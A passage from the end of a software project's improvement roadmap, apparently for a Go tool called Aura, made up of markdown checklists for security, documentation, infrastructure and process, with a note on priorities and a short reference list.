- [ ] Input validation comprehensive
- [ ] Dependencies up to date
- [ ] Security.md in place
- [ ] Docker images pinned with digests

### Documentation
- [ ] README comprehensive
- [ ] All commands documented
- [ ] Troubleshooting guide complete
- [ ] Contributing guidelines
- [ ] Security policy

### User Experience
- [ ] Installation smooth
- [ ] Errors are helpful
- [ ] Status checking works
- [ ] Uninstall complete
- [ ] Logging useful for debugging

---

## Final Gold Standard Checklist

### Code
- [ ] No security vulnerabilities
- [ ] >70% test coverage
- [ ] Structured logging
- [ ] Proper error handling
- [ ] No hardcoded values
- [ ] Context support
- [ ] Build info in binary

### Infrastructure
- [ ] CI/CD fully automated
- [ ] Security scans blocking
- [ ] Docker images pinned
- [ ] Dependabot configured
- [ ] Health checks on services

### Documentation
- [ ] SECURITY.md
- [ ] CONTRIBUTING.md
- [ ] CODE_OF_CONDUCT.md
- [ ] Comprehensive README
- [ ] API documentation (if applicable)
- [ ] Examples for all use cases

### Process
- [ ] Semantic versioning
- [ ] Conventional commits
- [ ] Automated releases
- [ ] Change log maintained
- [ ] Issues triaged

---

## Notes

This roadmap represents approximately 2-3 weeks of focused work to bring Aura to gold standard quality. Priority should be:

1. **Security First** - Critical issues are actual vulnerabilities
2. **Quality Second** - High priority issues affect maintainability
3. **Polish Last** - Medium/Low issues improve user experience

Each issue has been designed to be independently implementable with clear acceptance criteria. Work can be parallelized by tackling issues from different categories simultaneously.

**Target Rating:** 9.5/10 (up from current 6.5/10)

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Go Security Checklist](https://github.com/guardrails golang-security-guide)
- [Conventional Commits](https://www.conventionalcommits.org/)
- [Semantic Versioning](https://semver.org/)
- [Docker Best Practices](https://docs.docker.com/develop/dev-best-practices/)
